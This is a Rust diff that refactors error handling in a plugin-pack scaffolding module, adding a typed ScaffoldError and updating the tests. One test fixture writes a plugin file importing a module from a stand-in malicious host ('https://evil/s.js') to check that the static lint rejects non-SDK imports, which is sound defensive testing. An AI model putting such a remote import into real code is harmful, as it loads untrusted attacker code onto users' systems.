@@ -1,11 +1,37 @@
 use std::path::{Path, PathBuf};
 
-use anyhow::{Context, Result};
+use anyhow::Context;
 use serde::Serialize;
 use serde_json::{json, Value};
 
 use super::names::Names;
 use super::template::{Kind, Template};
+
+#[derive(Debug, thiserror::Error)]
+pub enum ScaffoldError {
+    #[error("{} already exists", path.display())]
+    SourceExists { path: PathBuf },
+    #[error("gents cannot build {language:?} plugins; use one of {}", crate::pack::SUPPORTED_PLUGIN_LANGUAGES.join(", "))]
+    UnsupportedLanguage { language: String },
+    #[error("plugin source parent")]
+    SourceParent,
+    #[error("reading {}", path.display())]
+    Read {
+        path: PathBuf,
+        #[source]
+        source: std::io::Error,
+    },
+    #[error("writing {}", path.display())]
+    Write {
+        path: PathBuf,
+        #[source]
+        source: std::io::Error,
+    },
+    #[error(transparent)]
+    Io(#[from] std::io::Error),
+}
+
+type Result<T, E = ScaffoldError> = std::result::Result<T, E>;
 
 #[derive(Clone, Debug)]
 pub struct ScaffoldInput {
@@ -39,7 +65,7 @@ impl Template {
     }
 }
 
-pub fn scaffold(dir: &Path, name: &str, input: &ScaffoldInput) -> Result<ScaffoldReport> {
+pub fn scaffold(dir: &Path, name: &str, input: &ScaffoldInput) -> anyhow::Result<ScaffoldReport> {
     anyhow::ensure!(
         !dir.join("manifest.json").exists(),
         "{} already holds a pack",
@@ -235,7 +261,11 @@ pub fn scaffold(dir: &Path, name: &str, input: &ScaffoldInput) -> Result<Scaffol
 }
 
 fn list_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<()> {
-    for entry in std::fs::read_dir(dir).with_context(|| format!("reading {}", dir.display()))? {
+    let entries = std::fs::read_dir(dir).map_err(|source| ScaffoldError::Read {
+        path: dir.to_path_buf(),
+        source,
+    })?;
+    for entry in entries {
         let entry = entry?;
         if entry.file_type()?.is_dir() {
             list_files(root, &entry.path(), out)?;
@@ -324,13 +354,16 @@ fn scaffold_plugin(dir: &Path, names: &Names, language: Option<&str>) -> Result<
 
 pub fn write_plugin_source(source: &Path, name: &str, language: Option<&str>) -> Result<String> {
     let language = language.unwrap_or("rust").trim().to_ascii_lowercase();
-    let entry = super::build::plugin_entry(&language).with_context(|| {
-        format!(
-            "gents cannot build {language:?} plugins; use one of {}",
-            crate::pack::SUPPORTED_PLUGIN_LANGUAGES.join(", ")
-        )
+    let entry = super::build::plugin_entry(&language).ok_or_else(|| {
+        ScaffoldError::UnsupportedLanguage {
+            language: language.clone(),
+        }
     })?;
-    anyhow::ensure!(!source.exists(), "{} already exists", source.display());
+    if source.exists() {
+        return Err(ScaffoldError::SourceExists {
+            path: source.to_path_buf(),
+        });
+    }
     let mut files = vec![
         (entry.to_owned(), echo_source(entry)),
         (
@@ -349,9 +382,11 @@ pub fn write_plugin_source(source: &Path, name: &str, language: Option<&str>) ->
     }
     for (path, contents) in files {
         let target = source.join(path);
-        std::fs::create_dir_all(target.parent().context("plugin source parent")?)?;
-        std::fs::write(&target, contents)
-            .with_context(|| format!("writing {}", target.display()))?;
+        std::fs::create_dir_all(target.parent().ok_or(ScaffoldError::SourceParent)?)?;
+        std::fs::write(&target, contents).map_err(|source| ScaffoldError::Write {
+            path: target.clone(),
+            source,
+        })?;
     }
     Ok(language)
 }
@@ -534,6 +569,7 @@ fn readme(names: &Names, template: Template) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use gents_protocol::error_chain::ErrorChain;
 
     fn input(template: Template) -> ScaffoldInput {
         ScaffoldInput {
@@ -559,9 +595,9 @@ mod tests {
             assert!(report.files.contains(&"manifest.json".to_owned()));
             let manifest: crate::pack::PackManifest =
                 serde_json::from_slice(&std::fs::read(dir.join("manifest.json")).unwrap())
-                    .unwrap_or_else(|error| panic!("{template:?}: {error:#}"));
+                    .unwrap_or_else(|error| panic!("{template:?}: {}", ErrorChain(&error)));
             crate::pack::validate_manifest("review_toolkit", &manifest)
-                .unwrap_or_else(|error| panic!("{template:?}: {error:#}"));
+                .unwrap_or_else(|error| panic!("{template:?}: {}", ErrorChain(error.as_ref())));
             if template == Template::Graph {
                 assert_eq!(
                     manifest.compiler_version.as_deref(),
@@ -626,10 +662,10 @@ mod tests {
     struct NoPlugins;
 
     impl super::super::build::PluginCompiler for NoPlugins {
-        fn load_and_validate(&self, _owner: &str, _dir: &Path) -> Result<()> {
+        fn load_and_validate(&self, _owner: &str, _dir: &Path) -> anyhow::Result<()> {
             unreachable!("an assets pack has no plugin to build")
         }
-        fn compile(&self, _owner: &str, _dir: &Path, _out_path: &Path) -> Result<()> {
+        fn compile(&self, _owner: &str, _dir: &Path, _out_path: &Path) -> anyhow::Result<()> {
             unreachable!("an assets pack has no plugin to build")
         }
     }
@@ -656,9 +692,10 @@ mod tests {
         std::fs::write(&entry, "import x from 'https://evil/s.js'\nexport default { id: 'review_toolkit', register() {} }\n").unwrap();
         let error = super::super::build::build_pack(&dir, &NoPlugins, None).unwrap_err();
         assert!(
-            format!("{error:#}").contains("static lint refuses")
-                && format!("{error:#}").contains("non-sdk import"),
-            "{error:#}"
+            format!("{}", ErrorChain(error.as_ref())).contains("static lint refuses")
+                && format!("{}", ErrorChain(error.as_ref())).contains("non-sdk import"),
+            "{}",
+            ErrorChain(error.as_ref())
         );
     }
 
